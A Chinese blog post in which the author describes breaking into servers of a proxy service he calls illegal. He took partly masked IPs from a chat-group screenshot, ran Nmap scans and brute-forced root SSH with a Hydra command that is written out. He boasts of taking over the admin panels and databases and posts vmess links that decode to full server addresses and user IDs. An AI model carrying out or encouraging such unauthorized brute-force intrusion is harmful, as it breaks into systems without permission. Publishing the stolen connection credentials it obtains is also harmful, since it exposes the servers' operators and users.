---
title: 非法搭建机场获取权限
author: APT - 0x44LL
date: 2021-12-25
category: Jekyll
layout: post
---

## 天网恢恢 疏而不漏
![smiley](/public/DocsPics/20220207155219.png)

根据wx群聊看到有人发机场截图并暴露了IP地址
![smiley](/public/DocsPics/20220207155341.jpg)

于是全部记录了下来，依次排列好；

```
168.63.xxx.106
20.187.xxx.80
20.205.xxx.204
20.212.xxx.178
```

快速Nmap扫描了一波；
![smiley](/public/DocsPics/20220207155424.png)

看到22端口开放
Hydrawin版本加载字典进行端口爆破，当然要使用上我亲自开过光的字典和飞升过的动态IP了

```
hydra.exe -l root -P 22 开光字典.txt -vV -o ssh.log -e ns 127.0.0.1 ssh
```

![smiley](/public/DocsPics/20220207155510.png)

**于是就这样进入了服务器...**


数据库
面板账户唯一登入密码
![smiley](/public/DocsPics/20220207155528.png)

所有的管理后台面板全部拿到权限
![smiley](/public/DocsPics/20220207155602.png)
![smiley](/public/DocsPics/20220207155713.png)

```
vmess://ewogICJ2IjogIjIiLAogICJwcyI6ICJBWi1GMlMtSEstODAtV1MiLAogICJhZGQiOiAiMTY4LjYzLjIxMi4xMDYiLAogICJwb3J0IjogODAsCiAgImlkIjogIjRjOTA4ZTgxLWM2YzYtNGNiNy1lZDQ5LWRjODhlN2NkZjkxNCIsCiAgImFpZCI6IDAsCiAgIm5ldCI6ICJ3cyIsCiAgInR5cGUiOiAibm9uZSIsCiAgImhvc3QiOiAiZ3cuYWxpY2RuLmNvbSIsCiAgInBhdGgiOiAiIiwKICAidGxzIjogIm5vbmUiCn0=
```

```
vmess://ewogICJ2IjogIjIiLAogICJwcyI6ICJBWi1CMVMtSEstODAtV1MiLAogICJhZGQiOiAiMjAuMjA1LjExOC4yMDQiLAogICJwb3J0IjogODAsCiAgImlkIjogIjhjYzgwOWQzLTk1YzAtNDg4Yi1jZmUwLTk4ZWVlZDM4MzYzYiIsCiAgImFpZCI6IDAsCiAgIm5ldCI6ICJ3cyIsCiAgInR5cGUiOiAibm9uZSIsCiAgImhvc3QiOiAiZ3cuYWxpY2RuLmNvbSIsCiAgInBhdGgiOiAiIiwKICAidGxzIjogIm5vbmUiCn0=
```
![smiley](/public/DocsPics/20220207155731.png)

很遗憾的是这些服务器都没什么东西；

查询了一下是刚开不久的；
